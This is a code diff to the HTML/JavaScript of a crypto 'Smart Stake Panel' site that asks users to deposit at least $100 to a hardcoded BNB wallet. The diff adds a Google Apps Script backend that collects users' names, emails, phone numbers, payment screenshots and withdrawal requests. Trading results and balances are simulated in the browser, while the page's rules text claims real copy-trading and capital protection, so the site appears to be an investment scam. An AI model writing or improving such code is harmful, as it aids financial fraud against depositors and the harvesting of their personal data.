@@ -124,7 +124,6 @@
         .copy-btn { background: #0284c7; color: white; border: none; padding: 6px 10px; border-radius: 4px; font-size: 10.5px; font-weight: bold; cursor: pointer; }
         .warning-box { background: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; color: #fca5a5; font-size: 10.5px; padding: 8px; border-radius: 6px; margin: 10px 0; text-align: left; line-height: 1.4; }
 
-        /* Professional Profile Styling */
         .profile-container { text-align: center; }
         .profile-avatar-box {
             width: 70px; height: 70px; border-radius: 50%; background: linear-gradient(135deg, #0284c7, #38bdf8);
@@ -248,13 +247,16 @@
 </div>
 
 <script>
+    // ⚠️ APNA GOOGLE APPS SCRIPT WEB APP URL APNI SHEET SE COPY KARKE YAHA PASTE KAREN
+    const WEB_APP_URL = "https://script.google.com/macros/s/YOUR_EXEC_ID/exec";
+
     const DEPOSIT_ADDRESS = "0xfeff2067ef1a43aa4bca186f702b2669971debbd";
     const NETWORK_NAME = "BNB Smart Chain (BEP20)";
 
     let currentUser = JSON.parse(localStorage.getItem('traderUser')) || null;
     let chartAnimationInterval = null;
 
-    // Stars particle effect
+    // Background particles
     const container = document.getElementById('stars-container');
     for (let i = 0; i < 30; i++) {
         const star = document.createElement('div');
@@ -290,15 +292,56 @@
     fetchLiveGoldPrice();
     setInterval(fetchLiveGoldPrice, 3000);
 
+    // API Helper Call
+    async function apiPost(payload) {
+        if (!WEB_APP_URL || WEB_APP_URL.includes("YOUR_EXEC_ID")) return;
+        try {
+            await fetch(WEB_APP_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        } catch (err) {
+            console.error("API POST Error:", err);
+        }
+    }
+
+    async function checkSheetApproval() {
+        if (!currentUser || !WEB_APP_URL || WEB_APP_URL.includes("YOUR_EXEC_ID")) return;
+        try {
+            const url = `${WEB_APP_URL}?email=${encodeURIComponent(currentUser.email)}&phone=${encodeURIComponent(currentUser.phone)}`;
+            const res = await fetch(url);
+            const data = await res.json();
+
+            if (data.result === "success") {
+                if (data.isApproved && data.depositAmount > 0) {
+                    localStorage.setItem('depositBal', data.depositAmount.toFixed(2));
+                }
+            }
+        } catch (e) {
+            console.error("Sheet Sync Check Error:", e);
+        }
+    }
+
     function checkAuth() {
         if (currentUser) {
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('main-dashboard').style.display = 'block';
             document.getElementById('bottom-navbar').style.display = 'flex';
             if (!currentUser.refCode) currentUser.refCode = generateReferralCode(currentUser.email);
+            
+            checkSheetApproval();
             loadBalances();
             renderTradeHistory();
             checkTradeLockStatus();
+
+            // Heartbeat system (Active)
+            apiPost({
+                action: "HEARTBEAT_ACTIVE",
+                email: currentUser.email,
+                phone: currentUser.phone
+            });
         } else {
             document.getElementById('auth-screen').style.display = 'block';
             document.getElementById('main-dashboard').style.display = 'none';
@@ -322,7 +365,7 @@
         return 'REF' + Math.abs(hash).toString(16).toUpperCase().substring(0, 6);
     }
 
-    function handleRegistration() {
+    async function handleRegistration() {
         const fname = document.getElementById('reg-fname').value.trim();
         const lname = document.getElementById('reg-lname').value.trim();
         const email = document.getElementById('reg-email').value.trim().toLowerCase();
@@ -333,6 +376,14 @@
         let myRefCode = generateReferralCode(email);
         currentUser = { fname, lname, email, phone, refCode: myRefCode };
         localStorage.setItem('traderUser', JSON.stringify(currentUser));
+
+        // Submit SIGNUP Event to Apps Script
+        await apiPost({
+            action: "SIGNUP",
+            name: `${fname} ${lname}`,
+            email: email,
+            phone: phone
+        });
 
         document.getElementById('auth-screen').style.display = 'none';
         document.getElementById('sync-overlay').style.display = 'flex';
@@ -463,7 +514,7 @@
         }, 1000);
     }
 
-    function finishTradeExecution() {
+    async function finishTradeExecution() {
         if (chartAnimationInterval) clearInterval(chartAnimationInterval);
         
         let state = getTradeState();
@@ -480,6 +531,13 @@
             localStorage.setItem('currentBal', currBal.toFixed(2));
             resultMsg = `🎉 PROFIT! Perfect Prediction!\nYou Earned: +$1.00`;
             addTradeHistoryRecord(lastUserChoice, "+$1.00");
+
+            // Sync profit update to Sheet
+            apiPost({
+                action: "MINING_PROFIT",
+                email: currentUser.email,
+                phone: currentUser.phone
+            });
         } else {
             resultMsg = `📉 LOSS! Market Reversed.\nProfit: $0.00`;
         }
@@ -534,7 +592,7 @@
         container.innerHTML = html;
     }
 
-    /* ---------------- WITHDRAWAL SYSTEM (50$ LIMIT + TRON/BNB NETWORKS) ---------------- */
+    /* ---------------- WITHDRAWAL SYSTEM ---------------- */
 
     function handleWithdrawalClick() {
         let currBal = parseFloat(localStorage.getItem('currentBal')) || 0.00;
@@ -578,7 +636,7 @@
         showPopup("💰 Withdraw Funds", withContent);
     }
 
-    function submitWithdrawalRequest() {
+    async function submitWithdrawalRequest() {
         let currBal = parseFloat(localStorage.getItem('currentBal')) || 0.00;
         const net = document.getElementById('with-network').value;
         const amt = parseFloat(document.getElementById('with-amount').value);
@@ -594,6 +652,16 @@
         localStorage.setItem('currentBal', newBal.toFixed(2));
         localStorage.setItem('withdrawalBal', withBal.toFixed(2));
         loadBalances();
+
+        // Send Withdrawal Event to Sheet
+        await apiPost({
+            action: "WITHDRAWAL_REQUEST",
+            name: `${currentUser.fname} ${currentUser.lname}`,
+            email: currentUser.email,
+            phone: currentUser.phone,
+            amount: `$${amt.toFixed(2)}`,
+            txid: `${net} - ${addr}`
+        });
 
         const successNotice = `
             <div style="text-align:center;">
@@ -634,7 +702,12 @@
             </div>
 
             <div class="input-group">
-                <label>Upload Payment Screenshot / TxID Proof</label>
+                <label>TxID / Hash Reference</label>
+                <input type="text" id="dep-txid" class="input-control" placeholder="e.g. 0x123abc456...">
+            </div>
+
+            <div class="input-group">
+                <label>Upload Payment Screenshot Proof</label>
                 <input type="file" id="dep-proof" class="input-control" accept="image/*">
             </div>
 
@@ -645,10 +718,48 @@
         showPopup("💳 Add Funds / Deposit", depContent);
     }
 
-    function submitDepositProof() {
+    async function submitDepositProof() {
         const amt = document.getElementById('dep-amount').value;
+        const txid = document.getElementById('dep-txid').value.trim();
+        const fileInput = document.getElementById('dep-proof');
+
         if (!amt || parseFloat(amt) < 100) return alert("Minimum deposit amount is $100.");
 
+        let base64Image = "";
+        if (fileInput.files && fileInput.files[0]) {
+            const file = fileInput.files[0];
+            const reader = new FileReader();
+            reader.onload = async function (e) {
+                base64Image = e.target.result;
+                
+                await apiPost({
+                    action: "DEPOSIT_PROOF_SUBMITTED",
+                    name: `${currentUser.fname} ${currentUser.lname}`,
+                    email: currentUser.email,
+                    phone: currentUser.phone,
+                    amount: `$${parseFloat(amt).toFixed(2)}`,
+                    txid: txid || "-",
+                    screenshot: base64Image
+                });
+
+                showDepositSuccessPopup();
+            };
+            reader.readAsDataURL(file);
+        } else {
+            await apiPost({
+                action: "DEPOSIT_PROOF_SUBMITTED",
+                name: `${currentUser.fname} ${currentUser.lname}`,
+                email: currentUser.email,
+                phone: currentUser.phone,
+                amount: `$${parseFloat(amt).toFixed(2)}`,
+                txid: txid || "-",
+                screenshot: ""
+            });
+            showDepositSuccessPopup();
+        }
+    }
+
+    function showDepositSuccessPopup() {
         const notice = `
             <div style="text-align:center;">
                 <div style="font-size:24px; margin-bottom:10px;">⏳</div>
@@ -683,30 +794,8 @@
             <div style="font-size:10.5px; color:#cbd5e1; line-height:1.4;">
             • <strong>Minimum Funding Requirement:</strong> To activate the core earning engine, a minimum deposit of $100 is required.<br>
             • <strong>Smart Mining Activation:</strong> Once the $100 deposit is approved, the central "Mine" button will be unlocked on your dashboard. Users must activate/click "Mine" daily to harvest dynamic profits.<br>
-            • <strong>Network & Address Verification:</strong> Always double-check the deposit wallet address and selected blockchain network (e.g., TRC20, BEP20) before sending funds. Deposits sent to incorrect addresses or incompatible networks cannot be recovered.<br>
-            • <strong>Proof of Payment:</strong> Users must upload an authentic, clear screenshot/transaction hash (TxID). Providing manipulated or duplicate screenshots will lead to permanent account suspension.<br>
-            • <strong>Approval Timeline:</strong> Manual and automated verification takes between 1 to 6 hours to reflect in your panel balance.
-            </div>
-
-            <div style="font-weight:bold; color:#fbbf24; font-size:11px; margin-top:10px; margin-bottom:4px;">3. Dynamic Daily Profit & Trading Structure</div>
-            <div style="font-size:10.5px; color:#cbd5e1; line-height:1.4;">
-            • <strong>Real-Market Execution:</strong> Smart Stake Panel operates via genuine live copy-trading algorithms and expert execution. Returns are not fixed. Daily profits fluctuate in real time according to market conditions.<br>
-            • <strong>Capital Protection Model:</strong> Capital is managed under strict risk-management parameters to protect the principal balance while generating sustainable market returns.
-            </div>
-
-            <div style="font-weight:bold; color:#fbbf24; font-size:11px; margin-top:10px; margin-bottom:4px;">4. Withdrawal Lifecycle & Capital Lock Policy</div>
-            <div style="font-size:10.5px; color:#cbd5e1; line-height:1.4;">
-            • <strong>First Cycle Completion:</strong> To maintain strategy liquidity, initial deposits undergo a full cycle until cumulative profits equal the initial capital base.<br>
-            • <strong>Standard Minimum Withdrawal:</strong> Once the initial milestone is reached, subsequent regular withdrawals have a minimum threshold of $50.<br>
-            • <strong>Early Capital Exit / Account Termination:</strong> If a user requests an early account closure before completing the full operational cycle, they are permitted to withdraw all accumulated profits generated up to that date, and the account will be closed.<br>
-            • <strong>Payout Timelines:</strong> All withdrawal requests are processed within a 24 to 48 hour security clearance window.
-            </div>
-
-            <div style="font-weight:bold; color:#fbbf24; font-size:11px; margin-top:10px; margin-bottom:4px;">5. Security, Fair Use & Platform Compliance</div>
-            <div style="font-size:10.5px; color:#cbd5e1; line-height:1.4;">
-            • <strong>Single Account Policy:</strong> Only one account is permitted per user/IP. Creating multiple accounts to manipulate referral systems will result in an immediate freeze of balances.<br>
-            • <strong>Network Transaction Fees:</strong> Standard blockchain gas/network fees apply to external withdrawals and are deducted automatically at the time of payout.<br>
-            • <strong>Support & Dispute Resolution:</strong> For unresolved deposits or payout queries exceeding designated timeframes, users must contact official customer support.
+            • <strong>Network & Address Verification:</strong> Always double-check the deposit wallet address and selected blockchain network (e.g., TRC20, BEP20) before sending funds.<br>
+            • <strong>Proof of Payment:</strong> Users must upload an authentic, clear screenshot/transaction hash (TxID). Providing manipulated screenshots leads to permanent suspension.
             </div>
         `;
         showPopup("📜 Rules & Guidelines", rulesContent);
@@ -733,7 +822,7 @@
         showPopup("🤝 Referral Program", refHtml);
     }
 
-    /* ---------------- REDESIGNED PROFESSIONAL PROFILE MODAL WITH SIGN OUT ---------------- */
+    /* ---------------- PROFILE MODAL ---------------- */
 
     function openProfileModal() {
         let initial = (currentUser.fname ? currentUser.fname.charAt(0) : "U").toUpperCase();
@@ -771,6 +860,7 @@
 
     function handleSignOut() {
         if (confirm("Are you sure you want to sign out from Smart Stake Panel?")) {
+            apiPost({ action: "HEARTBEAT_OFFLINE", email: currentUser.email, phone: currentUser.phone });
             localStorage.removeItem('traderUser');
             currentUser = null;
             closePopup();
